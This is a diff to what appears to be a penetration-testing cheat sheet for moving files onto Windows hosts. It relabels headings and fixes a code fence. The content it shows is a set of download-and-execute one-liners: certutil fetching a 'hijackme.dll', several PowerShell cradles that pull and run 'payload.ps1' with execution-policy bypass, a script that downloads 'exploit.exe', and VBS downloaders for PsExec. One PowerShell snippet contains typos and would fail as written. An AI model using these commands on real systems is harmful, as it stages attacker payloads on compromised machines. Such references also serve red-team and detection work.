@@ -93,11 +93,11 @@ certutil
 ```
 certutil -urlcache -split -f "http://10.9.228.20/hijackme.dll" C:\temp\hijackme.dll
 ```
-powershell
+powershell #1
 ```powershell
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')
 ```
-
+powershell #2
 ```powershell
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >> wget.ps1
@@ -106,25 +106,24 @@ echo $file = "exploit.exe" >> wget.ps1
 echo $webclient.DownloadFile($url,$file) >> wget.ps1
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 ```
-
+powershell #3
 ```powershell
 $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://webserver/payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 iex(iwr 'http://webserver/payload.ps1')
-``
-
+```
+powershell #4
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('http://webserver/payload.ps1')
 ```
-
+powershell #5
 ```powershell
 $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://webserver/payload.ps1',$false);$h.send();iex $h.responseText
 ```
-
+powershell #6
 ```powershell
 $wr=[System.NET.WebRequest]::Create('http://webserver/payload.ps1');$r=$w.GetResponse();IEX ([System.IO.StreamReader]($r.GetReponsesStream())).ReadToEnd()
 ```
-
-vbs
+vbs #1
 ```
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") > script_shell.vbs
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> script_shell.vbs
@@ -138,8 +137,7 @@ echo     .savetofile "C:\Users\Public\PsExec.exe", 2 '//overwrite >> script_shel
 echo end with >> script_shell.vbs
 cscript script_shell.vbs
 ```
-
-vbs
+vbs #2
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
